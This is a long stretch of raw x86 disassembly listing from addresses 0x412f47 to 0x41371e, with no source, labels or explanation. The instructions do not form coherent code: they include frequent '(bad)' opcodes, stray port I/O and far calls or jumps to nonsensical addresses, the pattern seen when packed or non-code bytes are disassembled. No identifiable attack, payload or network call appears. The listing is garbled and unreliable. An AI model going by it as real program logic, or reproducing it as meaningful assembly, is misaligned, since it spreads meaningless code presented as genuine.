  412f47:	sbb    eax,0x3630a737
  412f4c:	lahf   
  412f4d:	stos   BYTE PTR es:[edi],al
  412f4e:	cs paddw mm7,mm0
  412f52:	(bad)  
  412f53:	dec    esp
  412f54:	and    eax,0xcda71943
  412f59:	iret   
  412f5a:	cmp    ebx,esp
  412f5c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  412f5e:	jle    0x412f83
  412f60:	jne    0x412f21
  412f62:	fst    QWORD PTR [eax-0x1ad90a89]
  412f68:	in     eax,0x1f
  412f6a:	mov    ds:0xe816a910,al
  412f6f:	arpl   WORD PTR [edx],si
  412f71:	out    dx,al
  412f72:	jo     0x412f3c
  412f74:	add    eax,0x87dc6ded
  412f79:	mov    eax,ds:0xdb86c45d
  412f7e:	in     eax,dx
  412f7f:	xchg   BYTE PTR [esi+0xcf76d8d],al
  412f85:	icebp  
  412f86:	test   eax,0xcf81ff30
  412f8b:	xchg   BYTE PTR [ebx-0x16896ba5],bh
  412f91:	cmp    al,0x86
  412f93:	dec    eax
  412f94:	loop   0x412fb5
  412f96:	sub    al,0x70
  412f98:	pop    eax
  412f99:	jne    0x412fb1
  412f9b:	call   0xe868:0xea203c15
  412fa2:	push   ebp
  412fa3:	and    BYTE PTR [esi-0x12cda4ad],al
  412fa9:	retf   0xa15c
  412fac:	ror    eax,cl
  412fae:	pop    es
  412faf:	jns    0x412f3f
  412fb1:	nop
  412fb2:	fs (bad) 
  412fb4:	and    cl,BYTE PTR [esi]
  412fb6:	fistp  DWORD PTR [eax]
  412fb8:	das    
  412fb9:	in     eax,0x87
  412fbb:	ficomp DWORD PTR [ebx]
  412fbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fbe:	scas   eax,DWORD PTR es:[edi]
  412fbf:	jecxz  0x412fe7
  412fc1:	inc    BYTE PTR [edi]
  412fc3:	mov    ds:0xf753ad05,al
  412fc8:	mov    WORD PTR fs:[eax],?
  412fcb:	xor    ah,dh
  412fcd:	clc    
  412fce:	sbb    bl,BYTE PTR [ebx+0x30]
  412fd1:	clc    
  412fd2:	es dec edi
  412fd4:	in     al,0x6e
  412fd6:	dec    ebp
  412fd7:	ror    BYTE PTR [ecx+0x33c05545],cl
  412fdd:	(bad)  
  412fde:	pusha  
  412fdf:	lahf   
  412fe0:	rcr    BYTE PTR [edi-0x378bdab5],0xa1
  412fe7:	mov    ebp,0xfd93aa3f
  412fec:	adc    esi,esp
  412fee:	and    eax,0x752cbf50
  412ff3:	lock aam 0xac
  412ff6:	ror    BYTE PTR [edx+0x15],1
  412ff9:	add    eax,0x20d12f85
  412ffe:	or     DWORD PTR [ebp+eax*1-0x31b15c68],edx
  413005:	pop    eax
  413006:	pop    esi
  413007:	xor    bh,cl
  413009:	repz (bad) 
  41300b:	out    0x72,eax
  41300d:	jg     0x412fe8
  41300f:	sbb    dl,al
  413011:	sbb    ecx,DWORD PTR [edi+0x6158fe72]
  413017:	jmp    FWORD PTR [ebp+0x2fe3be86]
  41301d:	ss push ebx
  41301f:	adc    al,0x31
  413021:	lds    esp,FWORD PTR [ecx+0x14]
  413024:	adc    al,BYTE PTR [ecx-0x618b193a]
  41302a:	mov    eax,ds:0x68f72636
  41302f:	out    dx,al
  413030:	mov    WORD PTR [esp+ebx*4-0x304bb621],fs
  413037:	mov    esp,0x7012519c
  41303c:	bound  edx,QWORD PTR [eax+0x3b935e6]
  413042:	add    ebp,esp
  413044:	cmp    eax,0x966afed6
  413049:	imul   ebp,DWORD PTR [ecx-0x52],0x59
  41304d:	pop    ebp
  41304e:	js     0x413018
  413050:	js     0x413021
  413052:	cld    
  413053:	les    esp,FWORD PTR [eax-0x7b]
  413056:	(bad)  
  413058:	aad    0x5f
  41305a:	in     al,0x73
  41305c:	adc    al,0x10
  41305e:	hlt    
  41305f:	adc    ch,BYTE PTR [esi+edx*2-0x7c]
  413063:	fadd   QWORD PTR [edx-0x79]
  413066:	add    eax,0x52afd296
  41306b:	dec    ebp
  41306c:	fmulp  st(1),st
  41306e:	dec    ecx
  41306f:	(bad)  
  413070:	(bad)  
  413072:	(bad)  
  413073:	popa   
  413074:	cmp    cl,BYTE PTR [edx]
  413076:	xchg   ebx,eax
  413077:	imul   esp,DWORD PTR ss:[edx],0x636caa0
  41307e:	cmp    eax,eax
  413080:	icebp  
  413081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413083:	dec    ecx
  413084:	div    BYTE PTR [esi]
  413086:	mov    ecx,0x83e19a5a
  41308b:	mov    bl,0xd
  41308d:	aas    
  41308e:	mov    WORD PTR [edx+0x40ee2ce6],cs
  413094:	fisubr WORD PTR [edx+0x6c]
  413097:	(bad)  
  413099:	stc    
  41309a:	push   es
  41309b:	dec    eax
  41309c:	cs sbb al,0x3
  41309f:	push   es
  4130a0:	cli    
  4130a1:	cmp    eax,0x4142c6b0
  4130a6:	adc    eax,0x90d2570f
  4130ab:	gs mov dh,0xc6
  4130ae:	pop    es
  4130af:	into   
  4130b0:	shl    DWORD PTR [edi+ebx*2+0x3c],1
  4130b4:	es adc al,0x7c
  4130b7:	inc    eax
  4130b8:	call   0x64c95323
  4130bd:	ficom  WORD PTR [esi-0x7e76b7d6]
  4130c3:	push   ss
  4130c4:	aam    0xdb
  4130c6:	cmp    BYTE PTR [esi],ch
  4130c8:	add    esp,DWORD PTR [esi]
  4130ca:	pop    ebp
  4130cb:	jle    0x413126
  4130cd:	xor    DWORD PTR [edi+0x49],edi
  4130d0:	hlt    
  4130d1:	jnp    0x413069
  4130d3:	sbb    eax,0x45236c55
  4130d8:	sbb    dh,al
  4130da:	push   ss
  4130db:	pop    ss
  4130dc:	push   esi
  4130dd:	nop
  4130de:	retf   0xb2ed
  4130e1:	enter  0x9c93,0x59
  4130e5:	push   DWORD PTR [esi-0x31]
  4130e8:	cmp    al,0xdc
  4130ea:	pop    es
  4130eb:	repnz mov ch,0x91
  4130ee:	(bad)  
  4130ef:	enter  0xe9c8,0xbc
  4130f3:	push   eax
  4130f4:	repnz repz bound ebp,QWORD PTR [eax+0x35]
  4130f9:	pushf  
  4130fa:	mov    esi,0x9f619674
  4130ff:	push   ss
  413100:	jb     0x41315b
  413102:	xchg   ebx,eax
  413103:	aad    0x79
  413105:	icebp  
  413106:	fxch   st(5)
  413108:	retf   
  413109:	xor    al,0x20
  41310b:	cdq    
  41310c:	jno    0x4130a5
  41310e:	clc    
  41310f:	(bad)  
  413110:	mov    bl,0xcc
  413112:	xor    al,0x18
  413114:	or     eax,0x8713df8a
  413119:	mov    ah,0x2d
  41311b:	cmp    al,0x1c
  41311d:	sbb    al,0x61
  41311f:	mov    cl,0x2f
  413121:	cmp    esi,DWORD PTR [edx+0x6c]
  413124:	dec    ebx
  413125:	ret    0xd1ae
  413128:	stos   DWORD PTR es:[edi],eax
  413129:	xchg   edx,eax
  41312a:	arpl   WORD PTR [esi+0x3c],cx
  41312d:	adc    BYTE PTR [edx+edx*4],bl
  413130:	les    edx,FWORD PTR [ebx]
  413132:	pop    edi
  413133:	or     BYTE PTR ds:[eax+0x2e],dh
  413137:	xchg   esi,eax
  413138:	push   ss
  413139:	jo     0x4131b8
  41313b:	push   ebp
  41313c:	add    eax,0xc331595f
  413141:	cmp    al,BYTE PTR [eax-0x37291663]
  413147:	xchg   ecx,eax
  413148:	jge    0x413142
  41314a:	cmp    ecx,eax
  41314c:	and    DWORD PTR [edx+0x52],esi
  41314f:	push   0xffffffc2
  413151:	xor    ecx,DWORD PTR [edi]
  413153:	mov    ds:0x1d2a12a1,eax
  413158:	sbb    DWORD PTR [ebx+0x72],edx
  41315b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41315c:	xor    edi,DWORD PTR [edi+ebx*2]
  41315f:	xchg   edx,eax
  413160:	sub    eax,0x39210143
  413165:	pop    ebp
  413166:	dec    edx
  413167:	daa    
  413168:	mov    dl,0x9f
  41316a:	dec    ebp
  41316b:	cmp    dh,bh
  41316d:	pop    eax
  41316e:	and    al,0x1d
  413170:	mov    ebx,0xb176a7a4
  413175:	dec    esp
  413176:	or     dh,BYTE PTR [eax+eax*2-0x6f]
  41317a:	xchg   edi,eax
  41317b:	dec    eax
  41317c:	fbld   TBYTE PTR [edx]
  41317e:	pop    ss
  41317f:	dec    ebx
  413180:	mov    al,0xa2
  413182:	repz inc edx
  413184:	and    eax,0xbc92062f
  413189:	push   0x4f
  41318b:	arpl   WORD PTR [edx-0x75],sp
  41318e:	sub    eax,0xeeff9068
  413193:	mov    bh,BYTE PTR [ebp+0x624c48ad]
  413199:	inc    edi
  41319a:	rcr    BYTE PTR [eax],0xee
  41319d:	jl     0x41318a
  41319f:	jae    0x413202
  4131a1:	fdivr  QWORD PTR [esi-0x10]
  4131a4:	(bad)  
  4131a5:	aaa    
  4131a6:	xchg   edi,eax
  4131a7:	test   eax,0x8483f621
  4131ac:	sub    al,0xf8
  4131ae:	cmp    DWORD PTR [esi],edi
  4131b0:	sbb    al,0x85
  4131b3:	bound  eax,QWORD PTR [edx-0x44]
  4131b6:	lods   eax,DWORD PTR ds:[esi]
  4131b8:	out    0x4,al
  4131ba:	add    cl,BYTE PTR [ebx]
  4131bc:	jnp    0x41320d
  4131be:	ja     0x4131c8
  4131c0:	daa    
  4131c1:	add    BYTE PTR [edi-0x5f004805],bh
  4131c7:	sbb    BYTE PTR ss:[eax+0x53b1f995],dh
  4131ce:	and    bl,BYTE PTR [ecx]
  4131d0:	pop    ss
  4131d1:	pop    es
  4131d2:	fcmovne st,st(0)
  4131d4:	std    
  4131d5:	dec    esi
  4131d6:	or     eax,DWORD PTR [esi-0x3c]
  4131d9:	mov    edx,DWORD PTR [ebp+0x7e]
  4131dc:	sbb    BYTE PTR [ebp-0x20],bh
  4131df:	or     eax,0xa50c1608
  4131e4:	retf   0x4e47
  4131e7:	cmp    dh,dh
  4131e9:	cdq    
  4131ea:	stos   DWORD PTR es:[edi],eax
  4131eb:	xor    al,0xbf
  4131ed:	and    al,0xde
  4131ef:	or     ch,BYTE PTR [eax-0x1f529e02]
  4131f5:	jecxz  0x41317d
  4131f7:	push   0xffffffe8
  4131f9:	mov    al,ds:0x4e1edafe
  4131fe:	je     0x413274
  413200:	jl     0x41325b
  413202:	lods   al,BYTE PTR ds:[esi]
  413203:	in     al,dx
  413204:	pop    esi
  413205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413206:	scas   al,BYTE PTR es:[edi]
  413207:	sub    edi,DWORD PTR [edi]
  413209:	add    BYTE PTR [eax+0x5e63498c],dh
  41320f:	int3   
  413210:	pop    es
  413211:	(bad)  
  413212:	push   cs
  413213:	addr16 daa 
  413215:	shl    BYTE PTR [ebp+0x517e1caa],1
  41321b:	(bad)  
  41321c:	loopne 0x4131f0
  41321e:	rcl    DWORD PTR [eax+esi*2-0x4c502fd6],0x5c
  413226:	cmp    BYTE PTR [eax-0x270b59d1],dl
  41322c:	test   BYTE PTR [eax-0x43],ch
  41322f:	addr16 cwde 
  413231:	shl    DWORD PTR [edi],cl
  413233:	push   ebp
  413234:	loop   0x413287
  413236:	pop    ebx
  413237:	mov    ecx,0x4c95119d
  41323c:	jne    0x413288
  41323e:	add    cl,BYTE PTR [edi]
  413240:	jecxz  0x4132ab
  413242:	inc    ebx
  413243:	imul   DWORD PTR [edx-0x21]
  413246:	inc    esi
  413247:	inc    edi
  413248:	or     BYTE PTR [esi+ebx*4],dh
  41324b:	add    BYTE PTR [bp+si],bh
  41324e:	sti    
  41324f:	sbb    dh,BYTE PTR [edx]
  413251:	jb     0x41326a
  413253:	push   cs
  413254:	call   0xff9d:0x33732bf6
  41325b:	add    eax,0x885d6964
  413260:	call   FWORD PTR [ecx*1-0x60c1d8c3]
  413267:	or     al,0xfb
  413269:	mov    al,ds:0xee371fba
  41326e:	jecxz  0x413225
  413270:	xchg   ebp,eax
  413271:	jecxz  0x4131f7
  413273:	cmp    eax,0xab05a3f0
  413278:	xor    eax,0xc8cd1c59
  41327d:	nop
  41327e:	xchg   edi,eax
  41327f:	mov    esi,0x4b6da64d
  413284:	mov    bh,0xb4
  413286:	daa    
  413287:	test   DWORD PTR [edi+0x243e74c],0x333c2fa6
  413291:	sub    edx,ebx
  413293:	shr    BYTE PTR [ecx],0x6e
  413296:	pop    ss
  413297:	loopne 0x4132fd
  413299:	out    0xfe,eax
  41329b:	and    edi,ecx
  41329d:	and    bl,cl
  41329f:	cdq    
  4132a0:	bound  edx,QWORD PTR [ecx+0x2d]
  4132a3:	sbb    BYTE PTR [edi],bl
  4132a5:	or     DWORD PTR [ecx+0x22],ebp
  4132a8:	sbb    BYTE PTR [ecx-0x6234802a],dl
  4132ae:	(bad)  
  4132b0:	test   DWORD PTR [eax],0xf887ca5d
  4132b6:	lods   al,BYTE PTR ds:[esi]
  4132b7:	lods   al,BYTE PTR ds:[esi]
  4132b8:	fnstcw WORD PTR [edx+0x71]
  4132bb:	jo     0x4132aa
  4132bd:	retf   0xd9ca
  4132c0:	sti    
  4132c1:	fimul  DWORD PTR [esi+esi*2+0x52c43bbd]
  4132c8:	bnd jmp 0x4132bb
  4132cb:	data16 adc ch,dl
  4132ce:	(bad)  
  4132d0:	fist   DWORD PTR [edx]
  4132d2:	je     0x413313
  4132d4:	into   
  4132d5:	js     0x413289
  4132d7:	mov    esp,0xf15d0863
  4132dc:	pop    es
  4132dd:	sahf   
  4132de:	push   ebx
  4132df:	push   ebp
  4132e0:	call   DWORD PTR [esi]
  4132e2:	int    0x17
  4132e4:	(bad)  
  4132e5:	dec    eax
  4132e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132e7:	(bad)  
  4132e8:	mov    ecx,0x559601ce
  4132ed:	sub    edi,esp
  4132ef:	lods   al,BYTE PTR cs:[esi]
  4132f1:	popa   
  4132f2:	and    esi,DWORD PTR [eax-0x778d7b49]
  4132f8:	sbb    DWORD PTR [esi-0x21ad2c32],0xffffff86
  4132ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413300:	pop    ss
  413301:	adc    ch,BYTE PTR [ebp+0x53]
  413304:	lds    ecx,FWORD PTR [ebx]
  413306:	and    BYTE PTR [edi],0xfd
  413309:	xchg   edi,eax
  41330a:	inc    edi
  41330b:	fsub   st(5),st
  41330d:	xchg   ebx,eax
  41330e:	jmp    0x413350
  413310:	mov    cl,0xb
  413312:	ret    
  413313:	jmp    0x97127beb
  413318:	mov    BYTE PTR [eax],bh
  41331a:	adc    DWORD PTR [ebp-0x69],esp
  41331d:	(bad)
  413320:	inc    eax
  413321:	jb     0x41330d
  413323:	ins    DWORD PTR es:[edi],dx
  413324:	fwait
  413325:	mov    ch,0xaa
  413327:	ret    
  413328:	adc    eax,0xc491cf48
  41332d:	out    0x9f,al
  41332f:	or     al,0xe
  413331:	pop    es
  413332:	(bad)  
  413333:	mov    edi,0xe255cd1d
  413338:	stos   BYTE PTR es:[edi],al
  413339:	lea    ebx,[esi+eax*1-0x25]
  41333d:	sbb    edx,ebx
  41333f:	or     eax,0xf79e745
  413344:	imul   esp,edx,0x17fdff2d
  41334a:	add    DWORD PTR [edi],0xfb5eba9b
  413350:	pop    DWORD PTR [eax+ecx*2]
  413353:	sbb    esp,DWORD PTR [edx+0x2422d7b8]
  413359:	inc    edi
  41335a:	push   ebp
  41335b:	rcr    ebx,1
  41335d:	out    0xe,eax
  41335f:	mov    eax,esp
  413361:	and    bl,0x4e
  413364:	(bad)  
  413365:	stos   BYTE PTR es:[edi],al
  413366:	pop    ebp
  413367:	xor    esi,DWORD PTR [edx]
  413369:	jmp    0x65ea72d8
  41336e:	xor    al,0x43
  413370:	pop    esp
  413371:	test   cl,al
  413373:	xchg   BYTE PTR [esi+0x27],cl
  413376:	mov    esi,0x88d87665
  41337b:	out    0x78,al
  41337d:	push   edi
  41337e:	cs sub edi,edi
  413381:	pop    ss
  413382:	xchg   edx,eax
  413383:	pusha  
  413384:	cld    
  413385:	retf   0x42e6
  413388:	lods   eax,DWORD PTR ds:[esi]
  413389:	add    al,0x30
  41338b:	icebp  
  41338c:	or     bh,BYTE PTR [edi]
  41338e:	jns    0x4133ea
  413390:	inc    ebx
  413391:	mov    edi,DWORD PTR [edi+0x5ef9dc09]
  413397:	in     eax,dx
  413398:	addr16 mov edi,esi
  41339b:	dec    esi
  41339c:	jno    0x413415
  41339e:	stos   DWORD PTR es:[edi],eax
  41339f:	push   eax
  4133a0:	adc    al,0xa5
  4133a2:	xor    edi,0x663b9825
  4133a8:	pop    es
  4133a9:	or     BYTE PTR [ebx],dh
  4133ab:	(bad)  
  4133ac:	lock adc edx,DWORD PTR [eax+0x6e]
  4133b0:	ja     0x413406
  4133b2:	xor    DWORD PTR [ecx],ecx
  4133b4:	xchg   esp,eax
  4133b5:	pusha  
  4133b6:	icebp  
  4133b7:	mov    al,0x35
  4133b9:	retf   0xf379
  4133bc:	neg    bl
  4133be:	call   FWORD PTR [edx+0x30]
  4133c1:	sub    BYTE PTR [ebx-0x1f],0xad
  4133c5:	xor    eax,0x108a3990
  4133ca:	mov    ds:0xab7082c2,eax
  4133cf:	aam    0xab
  4133d1:	fistp  DWORD PTR [edi+0x70]
  4133d4:	repz jecxz 0x41340f
  4133d7:	cmp    DWORD PTR ds:0x75e7cbae,edx
  4133dd:	inc    edx
  4133de:	lods   al,BYTE PTR ds:[esi]
  4133df:	inc    esi
  4133e0:	ins    BYTE PTR es:[edi],dx
  4133e1:	std    
  4133e2:	mov    gs,WORD PTR [ecx-0x2a10f57]
  4133e8:	ds nop
  4133ea:	and    ebx,DWORD PTR [eax-0x29]
  4133ed:	jbe    0x413467
  4133ef:	mov    al,ds:0xd9316f09
  4133f4:	mov    WORD PTR [edi+0x7b],?
  4133f7:	ret    
  4133f8:	mov    dh,0xa7
  4133fa:	push   es
  4133fb:	in     eax,dx
  4133fc:	mov    al,ds:0xbd23727d
  413401:	popf   
  413402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413403:	test   al,0x3c
  413405:	in     al,0xea
  413407:	scas   eax,DWORD PTR es:[edi]
  413408:	push   0x5a
  41340a:	in     al,dx
  41340b:	pop    ebp
  41340c:	and    BYTE PTR [ebp+0x9],0x30
  413410:	push   edx
  413411:	adc    ebp,DWORD PTR [eax]
  413413:	sub    bh,ah
  413415:	jae    0x413467
  413417:	jbe    0x4133f3
  413419:	(bad)  
  41341b:	pop    edx
  41341c:	mov    ecx,DWORD PTR ss:[edi]
  41341f:	popa   
  413420:	mov    ah,0xea
  413422:	cmp    edi,0x8d6ffe59
  413428:	in     ax,dx
  41342a:	ins    BYTE PTR es:[edi],dx
  41342b:	pop    es
  41342c:	nop
  41342d:	sub    BYTE PTR [edx-0xd740639],ah
  413433:	push   ecx
  413434:	jp     0x413431
  413436:	enter  0x4b07,0xc8
  41343a:	test   DWORD PTR [ebx],0x92eae6d4
  413440:	jbe    0x413446
  413442:	icebp  
  413443:	push   esp
  413444:	imul   ebx,DWORD PTR [eax],0x3f79ce8c
  41344a:	mov    ch,0xd8
  41344c:	ror    DWORD PTR [ecx-0x59],0x1b
  413450:	rcl    BYTE PTR [ebx-0x61656e08],0x25
  413457:	je     0x413458
  413459:	imul   BYTE PTR [ebx]
  41345b:	das    
  41345c:	or     dl,BYTE PTR [edi+0x7f]
  41345f:	pop    es
  413460:	inc    esp
  413461:	pop    esi
  413462:	aad    0x60
  413464:	xchg   DWORD PTR [ecx],ecx
  413466:	and    eax,0x990af097
  41346b:	and    eax,0xc67e51b3
  413470:	shr    BYTE PTR [eax+0x47],0x77
  413474:	jge    0x413432
  413476:	shl    BYTE PTR [ecx],cl
  413478:	repz xchg edi,eax
  41347a:	lods   eax,DWORD PTR ds:[esi]
  41347b:	(bad)  
  41347d:	push   ds
  41347e:	mul    edi
  413480:	test   BYTE PTR ds:0x29a6f0a9,ch
  413486:	lock retf 0x4ea5
  41348a:	mov    al,ds:0x69dae2d
  41348f:	std    
  413490:	ror    BYTE PTR [eax+0x2f],cl
  413493:	fisub  WORD PTR [ebp-0x7e]
  413496:	cli    
  413497:	(bad)  
  413498:	aad    0xc0
  41349a:	das    
  41349b:	lock pop ss
  41349d:	push   edx
  41349e:	mov    esi,eax
  4134a0:	hlt    
  4134a1:	mov    eax,ds:0x2ccfc8a8
  4134a6:	sbb    ch,BYTE PTR [edi+0x4ee0a090]
  4134ac:	stc    
  4134ad:	jns    0x413466
  4134af:	gs test ah,0x35
  4134b3:	xchg   edx,eax
  4134b4:	or     esp,DWORD PTR ds:0x3ffa9ef1
  4134ba:	or     dh,BYTE PTR [esi]
  4134bc:	push   edi
  4134bd:	mov    edx,0xae23e00a
  4134c3:	lds    ebx,FWORD PTR [ebx+ebx*2]
  4134c6:	jbe    0x413533
  4134c8:	ret    
  4134c9:	pop    edx
  4134ca:	pop    es
  4134cb:	outs   dx,DWORD PTR ds:[esi]
  4134cc:	xor    al,0x6a
  4134ce:	sti    
  4134cf:	lods   eax,DWORD PTR ds:[esi]
  4134d0:	es jb  0x4134d5
  4134d3:	inc    edx
  4134d4:	and    al,dl
  4134d6:	mov    ebp,0x4c42e80d
  4134db:	mov    bl,0xef
  4134dd:	jl     0x4134e9
  4134df:	popa   
  4134e0:	sbb    ebp,DWORD PTR [edx-0xf]
  4134e3:	inc    ecx
  4134e4:	and    ecx,DWORD PTR [ebx*1-0x764e947e]
  4134eb:	inc    edx
  4134ec:	in     al,dx
  4134ed:	or     ah,dl
  4134ef:	call   0xbc8e:0x82709fda
  4134f6:	cmp    DWORD PTR [edx+0x2f],ebp
  4134f9:	ja     0x413542
  4134fb:	sbb    BYTE PTR [ebp+0x76],ch
  4134fe:	pushf  
  4134ff:	out    dx,al
  413500:	xchg   ecx,eax
  413501:	mov    cl,0x2c
  413503:	push   cs
  413504:	ja     0x4134b8
  413506:	mov    ebp,0xd14df66b
  41350b:	clc    
  41350c:	dec    esp
  41350d:	dec    ebp
  41350e:	or     esp,ecx
  413510:	xchg   ecx,eax
  413511:	pop    ebx
  413512:	(bad)  
  413513:	mov    cl,BYTE PTR [ebp-0x58]
  413516:	iret   
  413517:	jmp    0xf6a2:0x5645ec53
  41351e:	jp     0x4134bc
  413520:	and    BYTE PTR [edi],ch
  413522:	push   ecx
  413523:	adc    BYTE PTR [ecx],dl
  413525:	ins    BYTE PTR es:[edi],dx
  413526:	sub    ah,BYTE PTR [ebx-0x4e578909]
  41352c:	daa    
  41352d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41352e:	retf   0xba0c
  413531:	loope  0x4135af
  413533:	mov    al,0xb1
  413535:	pop    edi
  413536:	xchg   ecx,eax
  413537:	lahf   
  413538:	ror    BYTE PTR [ecx],0xe7
  41353b:	mov    ah,BYTE PTR gs:[edi-0x337e8f67]
  413542:	test   BYTE PTR [ebp-0x5aab0aad],cl
  413548:	and    esp,esp
  41354a:	and    edx,DWORD PTR [eax+0x32]
  41354d:	in     eax,0xa
  41354f:	push   esi
  413550:	inc    ecx
  413551:	add    eax,0xf659a47b
  413556:	adc    BYTE PTR [edx+0x5],0xb3
  41355a:	repnz xor ah,BYTE PTR [edi-0x518e8e91]
  413561:	int    0x20
  413563:	faddp  st(2),st
  413565:	das    
  413566:	push   ecx
  413567:	xchg   edx,eax
  413568:	call   0xb3b0e96c
  41356d:	aas    
  41356e:	(bad)  
  413570:	cmp    eax,0x951e4c6f
  413575:	div    ebp
  413577:	and    ebp,edx
  413579:	push   ds
  41357a:	jbe    0x4135de
  41357c:	fld    st(3)
  41357e:	xchg   esi,eax
  41357f:	pop    ebp
  413580:	xor    BYTE PTR [ebx+eax*2-0x7e30ce27],dh
  413587:	xchg   ebx,eax
  413588:	mov    dl,0xd9
  41358a:	xor    bh,BYTE PTR [edx-0x7b]
  41358d:	int    0x22
  41358f:	out    dx,eax
  413590:	mov    ebp,0xe06cbbb7
  413595:	inc    eax
  413596:	cwde   
  413597:	xor    al,0x17
  413599:	inc    ebx
  41359a:	add    DWORD PTR [edi-0x37],ebp
  41359d:	dec    esi
  41359e:	push   esi
  41359f:	inc    ecx
  4135a0:	xor    eax,0xe8f799b
  4135a5:	lahf   
  4135a6:	aam    0xbf
  4135a8:	popf   
  4135a9:	out    dx,al
  4135aa:	jmp    0xb4309586
  4135af:	inc    esp
  4135b0:	call   0xf02e:0xa7d42a76
  4135b7:	mov    edx,0x44fe9ab7
  4135bc:	in     eax,dx
  4135bd:	(bad)  
  4135be:	push   cs
  4135bf:	jbe    0x4135a5
  4135c1:	or     DWORD PTR [ebp*4+0x6f59488b],ebx
  4135c8:	mov    al,0x8b
  4135ca:	popf   
  4135cb:	sub    BYTE PTR [ebp-0x253701c4],dh
  4135d1:	enter  0xfe2f,0x37
  4135d5:	jno    0x413622
  4135d7:	faddp  st(5),st
  4135d9:	and    ah,ch
  4135db:	mov    ah,al
  4135dd:	repnz cmc 
  4135df:	xchg   ebp,eax
  4135e0:	leave  
  4135e1:	sub    bl,al
  4135e3:	dec    edx
  4135e4:	pop    ecx
  4135e5:	call   0xe8df:0x93ceea5d
  4135ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135ed:	jnp    0x413640
  4135ef:	sbb    esi,0x77
  4135f2:	test   al,0xf3
  4135f4:	lds    ebp,FWORD PTR [edi-0x51e8d9ee]
  4135fa:	stos   BYTE PTR es:[edi],al
  4135fb:	ds test eax,0xe03244b6
  413601:	and    BYTE PTR [esi+0x3c],bh
  413604:	clc    
  413605:	je     0x41359b
  413607:	add    DWORD PTR [ecx],eax
  413609:	repz sub esp,ebp
  41360c:	pop    ss
  41360d:	dec    edi
  41360e:	in     al,dx
  41360f:	stos   BYTE PTR es:[edi],al
  413610:	jns    0x41368b
  413612:	lea    eax,fs:[ebp+0x52]
  413616:	and    eax,0x7ca48eba
  41361b:	inc    edi
  41361c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41361d:	int    0xf9
  41361f:	aam    0xe9
  413621:	cmp    ecx,DWORD PTR [esi*2-0xbedd8e5]
  413628:	pushf  
  413629:	lods   eax,DWORD PTR ds:[esi]
  41362a:	fwait
  41362b:	sub    ebp,DWORD PTR [ebp+0x51]
  41362e:	sbb    DWORD PTR [ebp+0x14b8a25c],ecx
  413634:	xor    DWORD PTR [ecx-0x79],0xffffffea
  413638:	mov    ds:0xcf94a57d,eax
  41363d:	mov    ah,0xa9
  41363f:	adc    cl,ah
  413641:	ja     0x413609
  413643:	inc    esp
  413644:	mov    edx,cs
  413646:	shl    dh,0x85
  413649:	pop    ss
  41364a:	in     eax,dx
  41364b:	fdivr  st(2),st
  41364d:	(bad)  
  41364e:	daa    
  41364f:	ja     0x4135d9
  413651:	pop    esp
  413652:	push   edx
  413653:	(bad)
  413656:	iret   
  413657:	add    al,0x67
  413659:	push   esp
  41365a:	iret   
  41365b:	mov    ecx,0xdacfd306
  413660:	pop    eax
  413661:	call   0x4989e197
  413666:	js     0x41369b
  413668:	add    dh,dl
  41366a:	idiv   DWORD PTR [edx-0x56e5a2a3]
  413670:	(bad)  
  413671:	xchg   ebp,eax
  413672:	mov    ecx,0x2265b4d4
  413677:	mov    ecx,0xe34d8dd
  41367c:	mov    ds:0x1a6ac374,eax
  413681:	lahf   
  413682:	jp     0x4136f1
  413684:	mov    ds:0x94411af,al
  413689:	shl    DWORD PTR [ebp-0x23accbc9],cl
  41368f:	add    DWORD PTR [esi],ebp
  413691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413692:	fs leave 
  413694:	ret    0x149f
  413697:	add    edi,DWORD PTR [edx]
  413699:	sbb    DWORD PTR [edx],esp
  41369b:	and    BYTE PTR [ecx+0x13bf14b4],dl
  4136a1:	push   ss
  4136a2:	sub    BYTE PTR [ecx-0x25da5660],ch
  4136a8:	mov    edx,0x63c473ca
  4136ad:	push   eax
  4136ae:	xor    eax,0xb7408538
  4136b3:	add    eax,eax
  4136b5:	xchg   ecx,eax
  4136b6:	jmp    0x3bca3698
  4136bb:	sub    BYTE PTR [ebx+0x3c],0xf2
  4136bf:	mov    dl,0x5d
  4136c1:	cmp    al,0x55
  4136c3:	jbe    0x4136da
  4136c5:	sub    ebx,DWORD PTR [edi]
  4136c7:	lods   al,BYTE PTR ds:[esi]
  4136c8:	outs   dx,BYTE PTR ds:[esi]
  4136c9:	or     bl,cl
  4136cb:	jne    0x413668
  4136cd:	cmp    BYTE PTR [edx-0x16],dl
  4136d0:	sub    al,0x31
  4136d2:	clc    
  4136d3:	out    0xf3,eax
  4136d5:	sub    DWORD PTR [ecx-0x4b],edi
  4136d8:	push   ebx
  4136d9:	ficomp WORD PTR [edx-0x42]
  4136dc:	or     eax,0x24222efd
  4136e1:	sub    bh,dh
  4136e3:	push   0x2c
  4136e5:	aas    
  4136e6:	fwait
  4136e7:	ds mov eax,edx
  4136ea:	lahf   
  4136eb:	adc    edi,eax
  4136ed:	pop    ebx
  4136ee:	or     esp,ecx
  4136f0:	nop
  4136f1:	lock in eax,dx
  4136f3:	out    dx,al
  4136f4:	xchg   BYTE PTR ds:0x862e0911,al
  4136fa:	arpl   di,cx
  4136fc:	lods   al,BYTE PTR ds:[esi]
  4136fd:	sub    al,0x34
  4136ff:	daa    
  413700:	cmp    dh,al
  413702:	xlat   BYTE PTR ds:[ebx]
  413703:	and    ch,BYTE PTR [ebp-0x15]
  413706:	xchg   ecx,eax
  413707:	les    eax,FWORD PTR [eax+esi*8-0x4d]
  41370b:	cmc    
  41370c:	and    eax,0x21b4d21c
  413711:	test   BYTE PTR [edi-0x27],0xcb
  413715:	add    DWORD PTR [edx-0x18],ebp
  413718:	cmp    DWORD PTR [ebp-0x56c723],ebx
  41371e:	popa   
